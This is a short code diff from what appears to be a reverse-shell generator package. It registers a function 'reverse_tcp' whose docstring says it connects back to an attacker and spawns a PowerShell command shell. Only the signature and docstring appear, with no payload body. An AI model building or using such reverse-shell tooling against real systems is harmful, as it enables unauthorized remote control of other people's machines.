@@ -1,8 +1,9 @@
-__all__ = ['reverse_tcp']
-
 import base64
 
+from revshell.formatters import register
 
+
+@register
 def reverse_tcp(lhost: str, lport: int, *, exe_path='powershell.exe', background=True):
     """Connect back to attacker and spawn a command shell"""
 
